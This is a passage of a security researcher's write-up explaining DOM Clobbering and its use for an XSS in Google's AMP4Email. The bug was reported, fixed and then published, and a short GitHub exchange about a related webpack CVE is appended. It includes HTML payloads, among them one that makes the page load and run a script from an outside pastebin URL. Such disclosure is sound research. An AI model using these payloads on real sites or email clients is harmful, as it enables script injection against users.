There’s an interesting solution to this problem, though, that works in WebKit- and Blink-based browsers. Let’s say that we have two elements with the same `id`:

Python

<a id=test1>click!</a>
<a id=test1>click2!</a>

| 12 | <a id=test1>click!</a><a id=test1>click2!</a> |
| --- | --- |

So what we’re going to get when accessing `window.test1`? I’d intuitively expect getting the first element with that id (this is what happens when you try to call `document.getElementById('#test1')`. In Chromium, however, we actually get an `HTMLCollection`!

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-6.png)

Fig 4. `window.test1` points to `HTMLCollection`

What is particularly interesting here (and that can be spotted in fig. 4) is that the we can access specific elements in that `HTMLCollection` via index (`0` and `1` in the example) as well as by `id`. This means that `window.test1.test1` actually refers to the first element. It turns out that setting `name` attribute would also create new properties in the `HTMLCollection`. So now we have the following code:

Python

<a id=test1>click!</a>
<a id=test1 name=test2>click2!</a>

| 12 | <a id=test1>click!</a><a id=test1 name=test2>click2!</a> |
| --- | --- |

And we can access the second anchor element via `window.test1.test2`.

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-5.png)

Fig 5. We can make `window.test1.test2` defined

So going back to the original exercise of exploiting `eval(''+window.test1.test2)` via DOM Clobbering, the solution would be:

Python

<a id="test1"></a><a id="test1" name="test2" href="x:alert(1)"></a>

| 1 | <a id="test1"></a><a id="test1" name="test2" href="x:alert(1)"></a> |
| --- | --- |

Let’s now go back to AMP4Email to see how DOM Clobbering could be exploited in a real-world case.

## Exploiting DOM Clobbering in AMP4Email

I’ve already mentioned that AMP4Email could be vulnerable to DOM Clobbering by adding my own `id` attributes to elements. To find some exploitable condition, I decided to have a look at properties of `window` (Fig 6). The ones that immediately caught attention were beginning with `AMP`.

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png)

Fig 6. Properties of `window` global object

At this point, it turned out that AMP4Email actually employs some protection against DOM Clobbering because it strictly forbids certain values for `id` attribute, for instance: `AMP` (Fig 7.).

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png)

Fig 7. `AMP` is an invalid value for `id` in AMP4Email

The same restriction didn’t happen with `AMP_MODE`, though. So I prepared a code `<a id=AMP_MODE>` just to see what happens…

… and then I noticed a very interesting error in the console (Fig 8).

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png)

Fig 8. 404 on loading certain JS file

As seen in fig 8., AMP4Email tries to load certain JS file and fails to do so because of 404. What is particularly eye-catching, however, is the fact that there’s `undefined` in the middle of the URL (`https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.js`). There was just one plausible explanation why this happens I could come up with: AMP tries to get a property of `AMP_MODE` to put it in the URL. Because of DOM Clobbering, the expected property is missing, hence `undefined`. The code responsible for the code inclusion is shown below:

Python

f.preloadExtension = function(a, b) {
"amp-embed" == a && (a = "amp-ad");
var c = fn(this, a, !1);
if (c.loaded || c.error)
var d = !1;
else
void 0 === c.scriptPresent && (d = this.win.document.head.querySelector('[custom-element="' + a + '"]'),
c.scriptPresent = !!d),
d = !c.scriptPresent;
if (d) {
d = b;
b = this.win.document.createElement("script");
b.async = !0;
yb(a, "\_") ? d = "" : b.setAttribute(0 <= dn.indexOf(a) ? "custom-template" : "custom-element", a);
b.setAttribute("data-script", a);
b.setAttribute("i-amphtml-inserted", "");
var e = this.win.location;
t().test && this.win.testLocation && (e = this.win.testLocation);
if (t().localDev) {
var g = e.protocol + "//" + e.host;
"about:" == e.protocol && (g = "");
e = g + "/dist"
} else
e = hd.cdn;
g = t().rtvVersion;
null == d && (d = "0.1");
d = d ? "-" + d : "";
var h = t().singlePassType ? t().singlePassType + "/" : "";
b.src = e + "/rtv/" + g + "/" + h + "v0/" + a + d + ".js";
this.win.document.head.appendChild(b);
c.scriptPresent = !0
}
return gn(c)
}

| 12345678910111213141516171819202122232425262728293031323334 | f.preloadExtension = function(a, b) {            "amp-embed" == a && (a = "amp-ad");            var c = fn(this, a, !1);            if (c.loaded || c.error)                var d = !1;            else                void 0 === c.scriptPresent && (d = this.win.document.head.querySelector('[custom-element="' + a + '"]'),                c.scriptPresent = !!d),                d = !c.scriptPresent;            if (d) {                d = b;                b = this.win.document.createElement("script");                b.async = !0;                yb(a, "\_") ? d = "" : b.setAttribute(0 <= dn.indexOf(a) ?

| --- | --- |

While it is not particularly difficult to read, below is shown a manually deobfuscated form of the code (with some parts being omitted for clarity):

Python

var script = window.document.createElement("script");
script.async = false;
var loc;
if (AMP\_MODE.test && window.testLocation) {
loc = window.testLocation
} else {
loc = window.location;
}
if (AMP\_MODE.localDev) {
loc = loc.protocol + "//" + loc.host + "/dist"
} else {
loc = "https://cdn.ampproject.org";
}
var singlePass = AMP\_MODE.singlePassType ? AMP\_MODE.singlePassType + "/" : "";
b.src = loc + "/rtv/" + AMP\_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
document.head.appendChild(b);

| 1234567891011121314151617181920 | var script = window.document.createElement("script");script.async = false; var loc;if (AMP\_MODE.test && window.testLocation) {    loc = window.testLocation} else {    loc = window.location;} if (AMP\_MODE.localDev) {    loc = loc.protocol + "//" + loc.host + "/dist"} else {    loc = "https://cdn.ampproject.org";} var singlePass = AMP\_MODE.singlePassType ? AMP\_MODE.singlePassType + "/" : "";b.src = loc + "/rtv/" + AMP\_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js"; document.head.appendChild(b); |
| --- | --- |

So, in line 1, the code creates a new `script` element. Then, checks whether `AMP_MODE.test` and `window.testLocation` are both truthy. If they are, and also `AMP_MODE.localDev` is truthy (line 11), then `window.testLocation` is being used as a base for generating the URL of the script. Then, in lines 17 and 18 some other properties are concatenated to form the full URL. While it may not be obvious at the first sight, because of how the code is written and thanks to DOM Clobbering, we can actually control the full URL. Let’s assume that `AMP_MODE.localDev` and `AMP_MODE.test` are truthy, to see how the code simplifies even more:

Python

var script = window.document.createElement("script");
script.async = false;
b.src = window.testLocation.protocol + "//" +
window.testLocation.host + "/dist/rtv/" +
AMP\_MODE.rtvVersion; + "/" +
(AMP\_MODE.singlePassType ? AMP\_MODE.singlePassType + "/" : "") +
"v0/" + pluginName + ".js";
document.head.appendChild(b);

| 12345678910 | var script = window.document.createElement("script");script.async = false; b.src = window.testLocation.protocol + "//" +         window.testLocation.host + "/dist/rtv/" +         AMP\_MODE.rtvVersion; + "/" +         (AMP\_MODE.singlePassType ?

Do you remember our earlier exercise of overloading `window.test1.test2` with DOM Clobbering? Now we need to do the same, only overload `window.testLocation.protocol`. Hence the final payload:

Python

<!-- We need to make AMP\_MODE.localDev and AMP\_MODE.test truthy-->
<a id="AMP\_MODE"></a>
<a id="AMP\_MODE" name="localDev"></a>
<a id="AMP\_MODE" name="test"></a>
<!-- window.testLocation.protocol is a base for the URL -->
<a id="testLocation"></a>
<a id="testLocation" name="protocol"
href="https://pastebin.com/raw/0tn8z0rG#"></a>

| 123456789 | <!-- We need to make AMP\_MODE.localDev and AMP\_MODE.test truthy--><a id="AMP\_MODE"></a><a id="AMP\_MODE" name="localDev"></a><a id="AMP\_MODE" name="test"></a> <!-- window.testLocation.protocol is a base for the URL --><a id="testLocation"></a><a id="testLocation" name="protocol"    href="https://pastebin.com/raw/0tn8z0rG#"></a> |
| --- | --- |

Actually, the code didn’t execute in the real-world case because of Content-Security-Policy deployed in AMP:

Python

Content-Security-Policy: default-src 'none';
script-src 'sha512-oQwIl...=='
https://cdn.ampproject.org/rtv/
https://cdn.ampproject.org/v0.js
https://cdn.ampproject.org/v0/

| 12345 | Content-Security-Policy: default-src 'none'; script-src 'sha512-oQwIl...=='   https://cdn.ampproject.org/rtv/   https://cdn.ampproject.org/v0.js   https://cdn.ampproject.org/v0/ |
| --- | --- |

I didn’t find a way to bypass the CSP, but when trying to do so, I found an interesting way of bypassing dir-based CSP and [I tweeted about it](https://twitter.com/SecurityMB/status/1162690916722839552) (later it turned out that [the same trick was already used in a CTF in 2016](https://blog.0daylabs.com/2016/09/09/bypassing-csp/)). Google in their bug bounty program, don’t actually expect bypassing CSP and pay a full bounty anyway. It was still an interesting challenge; maybe someone else will find way to bypass 🙂

## Summary

In the post, I’ve shown how DOM Clobbering could be used to perform an XSS if certain conditions are met. It was surely an interesting ride! If you wish to play around with these kind of XSS-es, have a look at my [XSS Challenge](https://securitymb.github.io/xss/1/?xss=), which was based on this very XSS.

**Timeline**:

* 15th Aug 2019 – sending report to Google
* 16th Aug 2019 – “nice catch!”,
* 10th Sep 2019 – response from Google: “the bug is awesome, thanks for reporting!”,
* 12th Oct 2019 – confirmation from Google that the bug is fixed (although in reality it happened way earlier),
* 18th Nov 2019 – publication.

| I see [CVE-2024-43788](https://github.com/advisories/GHSA-4vvj-4cpr-p986 "CVE-2024-43788") was [patched](https://github.com/webpack/webpack/pull/18700) in Webpack 5, and the CVE shows that Webpack 4 and below are affected, but are Webpack 4 and below actually affected? I don't see any code in Webpack 4 that looks like the patch that was applied to Webpack 5. |

| I'm not expecting for it to be backported, but can you confirm that it actually does affect Webpack 4 and below? If it does affect Webpack 4, I will be looking to create a patch for myself, since moving to Webpack 5 isn't an option for me. |

| I believe this is when path.publicPath is set to auto, so I don't think this needs to be patched in v4, but I'll CC [@alexander-akait](https://github.com/alexander-akait) anyways to have a clear answer. |
